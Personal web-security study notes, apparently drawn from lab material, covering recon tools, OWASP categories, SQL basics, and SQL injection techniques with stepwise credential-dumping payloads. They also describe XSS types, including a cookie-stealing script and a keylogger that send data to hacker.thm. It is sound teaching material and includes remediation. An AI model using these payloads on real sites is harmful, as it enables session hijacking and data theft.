# Webb-app

## Table of content

- [tools](#tools)
  - [XSRFProbe](#XSRFProbe)
  - [sublist3r](#sublist3r)
  - [Hakrawler](#Hakrawler)
  - [gau](#gau)
  - [dnsrecon](#dnsrecon)
- [subdomain enumeration](#subdomain-enumeration)
- [owasp top 10](#owasp-top-10)
- [Broken Access Control](#Broken-Access-Control)
- [Cryptographic Failures ](#Cryptographic-Failures )
- [Injection](#Injection)
  - [basic SQL](#basic-SQL)
  - [What is SQL Injection](#What-is-SQL-Injection)
  - [In Band SQLi](#In-Band-SQLi)
  - [Blind SQLi Authentication Bypass](#Blind-SQLi-Authentication-Bypass)¨
  - [Blind SQLi Boolean Based](#Blind-SQLi-Boolean-Based)
  - [Blind SQLi Time Based](#Blind-SQLi-Time-Based)
  - [Out of Band SQLi](#Out-of-Band-SQLi)
  - [SQL injection Remediation](#SQL-injection-Remediation)
  - [Cross site Scripting](#Cross-site-Scripting)
  - [xss payload cheat sheets and resources](#xss-payload-cheat-sheets-and-resources)
  - [XSS Payloads](#XSS-Payloads)
  - [Reflected XSS](#Reflected-XSS)
  - [Stored XSS](#Stored-XSS)
  - [DOM Based XSS](#DOM-Based-XSS)
  - [Blind XSS](#Blind-XSS)
  - [Perfecting your payload](#Perfecting-your-payload)
  - [Practical Example Blind XSS](#Practical-Example-Blind-XSS)
- [Insecure Design](#Insecure-Design)
- [Security Misconfiguration](#Security-Misconfiguration)
- [Vulnerable and Outdated Components](#Vulnerable-and-Outdated-Components)
- [Identification and Authentication Failures](#Identification-and-Authentication-Failures)
- [Software and Data Integrity Failures](#Software-and-Data-Integrity-Failures)
- [Security Logging and Monitoring Failures](#Security-Logging-and-Monitoring-Failures)
- [Server-Side Request Forgery](#Server-Side-Request-Forgery)
- [Server Side Template Injection](#Server-Side-Template-Injection)
- [File Inclusion ](#File-Inclusion)
  - [Path Traversal](#Path-Traversal)
  - [Local File Inclusion LFI](#Local-File-Inclusion-LFI)
  - [Remote File Inclusion RFI](#Remote-File-Inclusion-RFI)
  - [LFI and RFI Remediation](#LFI-and-RFI-Remediation)



### tools

### XSRFProbe

The Prime Cross Site Request Forgery (CSRF) Audit and Exploitation Toolkit. 

XSRFProbe is an advanced Cross Site Request Forgery (CSRF/XSRF) Audit and Exploitation Toolkit. Equipped with a powerful crawling engine and numerous systematic checks, it is able to detect most cases of CSRF vulnerabilities, their related bypasses and futher generate (maliciously) exploitable proof of concepts with each found vulnerability.

```
https://github.com/0xInfection/XSRFProbe
```

### sublist3r
Search for subdomains 

This package contains a Python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu, and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS.

Subbrute was integrated with Sublist3r to increase the possibility of finding more subdomains using bruteforce with an improved wordlist, thanks to TheRook, author of subbrute.

```
https://www.kali.org/tools/sublist3r/
```

### Hakrawler
Simple, fast web crawler designed for easy, quick discovery of endpoints and assets within a web application

```
https://github.com/hakluke/hakrawler.git
```
```
https://www.kali.org/tools/hakrawler/
```

### gau
```
https://www.kali.org/tools/getallurls/
```
```
https://github.com/lc/gau
```

### dnsrecon

DNSRecon is a Python script that provides the ability to perform:

Check all NS Records for Zone Transfers.

Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).

Perform common SRV Record Enumeration.

Top Level Domain (TLD) Expansion.

Check for Wildcard Resolution.

Brute Force subdomain and host A and AAAA records given a domain and a wordlist.

Perform a PTR Record lookup for a given IP Range or CIDR.

Check a DNS Server Cached records for A, AAAA and CNAME

Records provided a list of host records in a text file to check.

Enumerate Hosts and Subdomains using Google

```
https://www.kali.org/tools/dnsrecon/
```



### subdomain enumeration


### owasp top 10

```
https://owasp.org/
```

### Broken Access Control
Common Weakness Enumerations (CWEs) included are 
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
CWE-201: Insertion of Sensitive Information Into Sent Data
CWE-352: Cross-Site Request Forgery.
```
https://owasp.org/Top10/A01_2021-Broken_Access_Control/
```

### Cryptographic Failures 
Notable Common Weakness Enumerations (CWEs) included are 
CWE-259: Use of Hard-coded Password
CWE-327: Broken or Risky Crypto Algorithm
CWE-331 Insufficient Entropy.
```
https://owasp.org/Top10/A02_2021-Cryptographic_Failures/
```

### Injection
Notable Common Weakness Enumerations (CWEs) included are 
CWE-79: Cross-site Scripting
CWE-89: SQL Injection
CWE-73: External Control of File Name or Path
```
https://owasp.org/Top10/A03_2021-Injection/
```
```
https://portswigger.net/web-security/cross-site-scripting
```
```
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
```
```
file:///tmp/mozilla_kali0/cheat-sheet.pdf
```
```
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
```
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
```
https://book.hacktricks.xyz/pentesting-web/sql-injection
```

### basic SQL  

What is a database?

A database is a way of electronically storing collections of data in an organised manner. A database is controlled by a DBMS which is an acronym for  Database Management System, DBMS's fall into two camps Relational or Non-Relational, the focus of this room will be on Relational databases,  some common one's you'll come across are MySQL, Microsoft SQL Server, Access, PostgreSQL and SQLite. We'll explain the difference between Relational and Non-Relational databases at the end of this task but first, it's important to learn a few terms.

Within a DBMS, you can have multiple databases, each containing its own set of related data. For example, you may have a database called "shop". Within this database, you want to store information about products available to purchase, users who have signed up to your online shop, and information about the orders you've received. You'd store this information separately in the database using something called tables, the tables are identified with a unique name for each one. You can see this structure in the diagram below, but you can also see how a business might have other separate databases to store staff information or the accounts team.

![image](https://user-images.githubusercontent.com/24814781/181730683-ca25cf99-ccf6-421a-b2b0-22923d739ce1.png)

Columns:

Each column, better referred to as a field has a unique name per table. When creating a column, you also set the type of data it will contain, common ones being integer (numbers), strings (standard text) or dates. Some databases can contain much more complex data, such as geospatial, which contains location information. Setting the data type also ensures that incorrect information isn't stored, such as the string "hello world" being stored in a column meant for dates. If this happens, the database server will usually produce an error message. A column containing an integer can also have an auto-increment feature enabled; this gives each row of data a unique number that grows (increments) with each subsequent row, doing so creates what is called a key field, a key field has to be unique for every row of data which can be used to find that exact row in SQL queries.


Rows:

Rows or records are what contains the individual lines of data. When you add data to the table, a new row/record is created, and when you delete data, a row/record is removed.



Relational Vs Non-Relational Databases:
A relational database, stores information in tables and often the tables have shared information between them, they use columns to specify and define the data being stored and rows to actually store the data. The tables will often contain a column that has a unique ID (primary key) which will then be used in other tables to reference it and cause a relationship between the tables, hence the name relational database.


Non-relational databases sometimes called NoSQL on the other hand is any sort of database that doesn't use tables, columns and rows to store the data, a specific database layout doesn't need to be constructed so each row of data can contain different information which can give more flexibility over a relational database.  Some popular databases of this type are MongoDB, Cassandra and ElasticSearch.

SQL (Structured Query Language) is a feature-rich language used for querying databases, these SQL queries are better referred to as statements.


The simplest of the commands which we'll cover in this task is used to retrieve (select), update, insert and delete data. Although somewhat similar, some databases servers have their own syntax and slight changes to how things work. All of these examples are based on a MySQL database. After learning the lessons, you'll easily be able to search for alternative syntax online for the different servers. It's worth noting that SQL syntax is not case sensitive.

SELECT

The first query type we'll learn is the SELECT query used to retrieve data from the database.

```
select * from users;
```

![image](https://user-images.githubusercontent.com/24814781/181731922-dda9ff50-aa9c-4976-8d42-81aa94acc4ff.png)

The first-word SELECT tells the database we want to retrieve some data, the * tells the database we want to receive back all columns from the table. For example, the table may contain three columns (id, username and password). "from users" tells the database we want to retrieve the data from the table named users. Finally, the semicolon at the end tells the database that this is the end of the query.  


The next query is similar to the above, but this time, instead of using the * to return all columns in the database table, we are just requesting the username and password field.

```
select username,password from users;
```

![image](https://user-images.githubusercontent.com/24814781/181732264-93a96d01-4d65-44f1-8cbb-064b10fa9bee.png)


The following query, like the first, returns all the columns by using the * selector and then the "LIMIT 1" clause forces the database only to return one row of data. Changing the query to "LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.

```
select * from users LIMIT 1;
```

![image](https://user-images.githubusercontent.com/24814781/181732646-c1d92391-5847-433a-a95a-2db1c153cfde.png)


Lastly, we're going to utilise the where clause; this is how we can finely pick out the exact data we require by returning data that matches our specific clauses:

```
select * from users where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181732844-fd4072b6-bc52-4c52-a842-706493d4639f.png)


This will only return the rows where the username is equal to admin.

```
select * from users where username != 'admin';
```

![image](https://user-images.githubusercontent.com/24814781/181733026-c5d5623e-665d-4e08-b333-7ad896a35481.png)

This will only return the rows where the username is NOT equal to admin.

```
select * from users where username='admin' or username='jon';
```

![image](https://user-images.githubusercontent.com/24814781/181733283-0393f3a0-f974-4e35-9eb7-b0b036beafc3.png)

This will only return the rows where the username is either equal to admin or jon. 

```
select * from users where username='admin' and password='p4ssword';
```

![image](https://user-images.githubusercontent.com/24814781/181733401-954f7b20-5cc2-4cd5-a8cd-a19bf58101e8.png)

This will only return the rows where the username is equal to admin, and the password is equal to p4ssword.


Using the like clause allows you to specify data that isn't an exact match but instead either starts, contains or ends with certain characters by choosing where to place the wildcard character represented by a percentage sign %.

```
select * from users where username like 'a%';
```

![image](https://user-images.githubusercontent.com/24814781/181733685-c02a1f84-42bb-465b-a0ab-e509252e6077.png)

This returns any rows with username beginning with the letter a.

```
select * from users where username like '%n';
```

![image](https://user-images.githubusercontent.com/24814781/181733770-86fe4f8f-1b57-4538-9843-32bf355165b4.png)


This returns any rows with username ending with the letter n.

```
select * from users where username like '%mi%';
```

![image](https://user-images.githubusercontent.com/24814781/181733893-49efaaa5-665f-4001-b2a6-f27d1af019a1.png)

UNION

The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same. This might sound not very clear, so let's use the following analogy. Say a company wants to create a list of addresses for all customers and suppliers to post a new catalogue. We have one table called customers with the following contents: 

![image](https://user-images.githubusercontent.com/24814781/181734143-c5c3c958-6095-48f5-a4ab-64862731cfb4.png)


And another called suppliers with the following contents:

![image](https://user-images.githubusercontent.com/24814781/181734193-cf3cbdc2-a034-4ad0-923c-ac3a9d3dce40.png)


Using the following SQL Statement, we can gather the results from the two tables and put them into one result set:

```
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
```

![image](https://user-images.githubusercontent.com/24814781/181734366-e5a8e203-ec50-4974-bba9-9f68c0b31b02.png)

INSERT

The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.

```
insert into users (username,password) values ('bob','password123');
```

![image](https://user-images.githubusercontent.com/24814781/181734580-f6a1eb8e-1395-4823-818f-c683ebacc30c.png)

UPDATE

The UPDATE statement tells the database we wish to update one or more rows of data within a table. You specify the table you wish to update using "update %tablename% SET" and then select the field or fields you wish to update as a comma-separated list such as "username='root',password='pass123'" then finally similar to the SELECT statement, you can specify exactly which rows to update using the where clause such as "where username='admin;".

```
update users SET username='root',password='pass123' where username='admin';
```

![image](https://user-images.githubusercontent.com/24814781/181734707-7e04e537-7f68-4aec-ab8c-9b48c330e4ec.png)


DELETE

The DELETE statement tells the database we wish to delete one or more rows of data. Apart from missing the columns you wish to be returned, the format of this query is very similar to the SELECT. You can specify precisely which data to delete using the where clause and the number of rows to be deleted using the LIMIT clause.

```
delete from users where username='martin';
```

![image](https://user-images.githubusercontent.com/24814781/181735171-c1d88d3b-556c-4b18-9a19-519ad383bc3b.png)


delete from users;


Because no WHERE clause was being used in the query, all the data is deleted in the table.

![image](https://user-images.githubusercontent.com/24814781/181735602-89133a1b-1641-4cb2-9214-677e910f5176.png)


### What is SQL Injection

What is SQL Injection?
The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query.

What does it look like?
Take the following scenario where you've come across an online blog, and each blog entry has a unique id number. The blog entries may be either set to public or private depending on whether they're ready for public release. The URL for each blog entry may look something like this:

```
https://website.thm/blog?id=1
```

From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:

```
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

From what you've learned in the previous task, you should be able to work out that the SQL statement above is looking in the blog table for an article with the id number of 1 and the private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.

As was mentioned at the start of this task, SQL Injection is introduced when user input is introduced into the database query. In this instance, the id parameter from the query string is used directly in the SQL query.

Let's pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:

```
https://website.thm/blog?id=2;--
```

Which would then, in turn, produce the SQL statement:

```
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:

```
SELECT * from blog where id=2;--
```

This was just one example of an SQL Injection vulnerability of a type called In-Band SQL Injection; there are 3 types in total In-Band, Blind and Out Of Band.


### In Band SQLi 

In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


Union-Based SQL Injection

This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

Practical tips and example:

The key to discovering error-based SQL Injection is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).


Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 


The first thing we need to do is return data to the browser without displaying an error message. Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:

```
1 UNION SELECT 1
```

This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:

```
1 UNION SELECT 1,2
```

Same error again, so let's repeat by adding another column:

```
1 UNION SELECT 1,2,3
```

Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.

```
0 UNION SELECT 1,2,3
```

You'll now see the article is just made up of the result from the UNION select returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:

```
0 UNION SELECT 1,2,database()
```

You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.


Our next query will gather a list of tables that are in this database.

```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


As the first level aims to discover Martin's password, the staff_users table is what is of interest to us. We can utilise the information_schema database again to find the structure of this table using the below query.

```
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```

This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.

```
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

Again we use the group_concat method to return all of the rows into one string and to make it easier to read. We've also added ,':', to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

### Blind SQLi Authentication Bypass 

Blind SQLi

Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless. It might surprise you that all we need is that little bit of feedback to successful enumerate a whole database.


Authentication Bypass

One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 


Login forms that are connected to a database of users are often developed in such a way that the web application isn't interested in the content of the username and password but more whether the two make a matching pair in the users table. In basic terms, the web application is asking the database "do you have a user with the username bob and the password bob123?", and the database replies with either yes or no (true/false) and, depending on that answer, dictates whether the web application lets you proceed or not. 


Taking the above information into account, it's unnecessary to enumerate a valid username/password pair. We just need to create a database query that replies with a yes/true.

Practical tips and example:

Level Two of the SQL Injection examples shows this exact example. We can see in the box labelled "SQL Query" that the query to the database is the following:


select * from users where username='%username%' and password='%password%' LIMIT 1;


N.B The %username% and %password% values are taken from the login form fields, the initial values in the SQL Query box will be blank as these fields are currently empty.


To make this into a query that always returns as true, we can enter the following into the password field:


' OR 1=1;--


Which turns the SQL query into the following:


select * from users where username='' and password='' OR 1=1;


Because 1=1 is a true statement and we've used an OR operator, this will always cause the query to return as true, which satisfies the web applications logic that the database found a valid username/password combination and that access should be allowed.


### Blind SQLi Boolean Based 

Boolean Based

Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes. That outcome confirms to us that our SQL Injection payload was either successful or not. On the first inspection, you may feel like this limited response can't provide much information. Still, in fact, with just these two responses, it's possible to enumerate a whole database structure and contents.


Practical tips and example:

On this example of SQL, you're presented with a mock browser with the following URL:

```
https://website.thm/checkuser?username=admin
```

The browser body contains the contents of {"taken":true}. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered to prompt the user to choose a different username. Because the taken value is set to true, we can assume the username admin is already registered. In fact, we can confirm this by changing the username in the mock browser's address bar from admin to admin123, and upon pressing enter, you'll see the value taken has now changed to false.


The SQL query that is processed looks like the following:

```
select * from users where username = '%username%' LIMIT 1;
```

As the only input, we have control over is the username in the query string, we'll have to use this to perform our SQL Injection. Keeping the username as admin123, we can start appending to this to try and make the database confirm true things, which will change the state of the taken field from false to true.


Like in previous levels, our first task is to establish the number of columns in the users table, which we can achieve by using the UNION statement. Change the username value to the following:

```
admin123' UNION SELECT 1;-- 
```

As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:

```
admin123' UNION SELECT 1,2,3;-- 
```

Now that our number of columns has been established, we can work on the enumeration of the database. Our first task is discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status.

Try the below username value and see what happens:

```
admin123' UNION SELECT 1,2,3 where database() like '%';--
```

We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s.

```
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

Now you move onto the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.


We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
```

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.


You'll finally end up discovering a table in the sqli_three database named users, which you can be confirmed by running the following username payload:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
```

Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials. Again using the information_schema database and the information we've already gained, we can start querying it for column names. Using the payload below, we search the columns table where the database is equal to sqli_three, the table name is users, and the column name begins with the letter a.

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

Again you'll need to cycle through letters, numbers and characters until you find a match. As you're looking for multiple results, you'll have to add this to your payload each time you find a new column name, so you don't keep discovering the same one. For example, once you've found the column named id, you'll append that to your original payload (as seen below).

```
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```

Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username which you can use the payload below:

```
admin123' UNION SELECT 1,2,3 from users where username like 'a%'
```

Which, once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:

```
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
```

### Blind SQLi Time Based 

Time-Based


A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

So, for example, when trying to establish the number of columns in a table, you would use the following query:

```
admin123' UNION SELECT SLEEP(5);--
```

If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:

```
admin123' UNION SELECT SLEEP(5),2;--
```

This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.


You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.

If you're struggling to find the table name the below query should help you on your way:

```
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

### Out of Band SQLi

Out-of-Band SQL Injection isn't as common as it either depends on specific features being enabled on the database server or the web application's business logic, which makes some kind of external network call based on the results from an SQL query.

An Out-Of-Band attack is classified by having two different communication channels, one to launch the attack and the other to gather the results. For example, the attack channel could be a web request, and the data gathering channel could be monitoring HTTP/DNS requests made to a service you control.

1) An attacker makes a request to a website vulnerable to SQL Injection with an injection payload.

2) The Website makes an SQL query to the database which also passes the hacker's payload.

3) The payload contains a request which forces an HTTP request back to the hacker's machine containing data from the database.

![image](https://user-images.githubusercontent.com/24814781/181909315-2aa7b7ff-92e8-4f49-81dc-6c084ae3d7a7.png)

### SQL injection Remediation 

Remediation

As impactful as SQL Injection vulnerabilities are, developers do have a way to protect their web applications from them by following the below advice:


Prepared Statements (With Parameterized Queries):

In a prepared query, the first thing a developer writes is the SQL query and then any user inputs are added as a parameter afterwards. Writing prepared statements ensures that the SQL code structure doesn't change and the database can distinguish between the query and the data. As a benefit, it also makes your code look a lot cleaner and easier to read.


Input Validation:

Input validation can go a long way to protecting what gets put into an SQL query. Employing an allow list can restrict input to only certain strings, or a string replacement method in the programming language can filter the characters you wish to allow or disallow. 


Escaping User Input:

Allowing user input containing characters such as ' " $ \ can cause SQL Queries to break or, even worse, as we've learnt, open them up for injection attacks. Escaping user input is the method of prepending a backslash (\) to these characters, which then causes them to be parsed just as a regular string and not a special character.



### Cross site Scripting
Prerequisites:
It's worth noting that because XSS is based on JavaScript, it would be helpful to have a basic understanding of the language. However, none of the examples is overly complicated—also, a basic understanding of Client-Server requests and responses.


Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users. In this room, you'll learn about the different XSS types, how to create XSS payloads, how to modify your payloads to evade filters, and then end with a practical lab where you can try out your new skills.


### xss payload cheat sheets and resources
```
https://netsec.expert/posts/xss-in-2021/
```
```
https://github.com/payloadbox/xss-payload-list
```
```
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
```


### XSS Payloads

What is a payload?

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.


The intention is what you wish the JavaScript to actually do (which we'll cover with some examples below), and the modification is the changes to the code we need to make it execute as every scenario is different (more on this in the perfecting your payload task).


Here are some examples of XSS intentions.


Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:

```
<script>alert('XSS');</script>
```

Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.

```
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:

```
<script>user.changeEmail('attacker@hacker.thm');</script>
```


### Reflected XSS

Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.


Example Scenario:

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the error parameter in the query string and is built directly into the page source. 

![image](https://user-images.githubusercontent.com/24814781/182373588-5628a832-16ec-48d7-a4e0-009b4556ba54.png)

The application doesn't check the contents of the error parameter, which allows the attacker to insert malicious code.

![image](https://user-images.githubusercontent.com/24814781/182373742-10aa396a-6a71-4535-95a5-c1999b79edb2.png)


The vulnerability can be used as per the scenario in the image below:

![image](https://user-images.githubusercontent.com/24814781/182373903-7bd30c4a-db10-4011-9ab3-b0d4e2f5b1ff.png)

Potential Impact:

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.

How to test for Reflected XSS:

You'll need to test every possible point of entry; these include:

    Parameters in the URL Query String
    URL File Path
    Sometimes HTTP Headers (although unlikely exploitable in practice)

Once you've found some data which is being reflected in the web application, you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected



### Stored XSS

Stored XSS

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

Example Scenario:

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

![image](https://user-images.githubusercontent.com/24814781/182374221-2ca4e450-24b1-46f6-be7e-29746849bc31.png)

Potential Impact:

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

How to test for Stored XSS:

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

    Comments on a blog
    User profile information
    Website Listings

Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 
Once you've found some data which is being stored in the web application,  you'll then need to confirm that you can successfully run your JavaScript payload; your payload will be dependent on where in the application your code is reflected 
 

### DOM Based XSS

DOM Based XSS

What is the DOM?

DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document, and this document can be either displayed in the browser window or as the HTML source. A diagram of the HTML DOM is displayed below:

![image](https://user-images.githubusercontent.com/24814781/182374865-3a213b46-3bb6-4c49-a983-2944a10833c3.png)

If you want to learn more about the DOM and gain a deeper understanding w3.org have a great resource.

Exploiting the DOM

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.


Example Scenario:

The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.


Potential Impact:

Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

How to test for Dom Based XSS:


DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.


When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().


### Blind XSS

Blind XSS

Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

Example Scenario:

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

Potential Impact:

Using the correct payload, the attacker's JavaScript could make calls back to an attacker's website, revealing the staff portal URL, the staff member's cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member's session and have access to the private portal.

How to test for Blind XSS:


When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.


A popular tool for Blind XSS attacks is xsshunter.
```
https://xsshunter.com/
```
Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

### Perfecting your payload

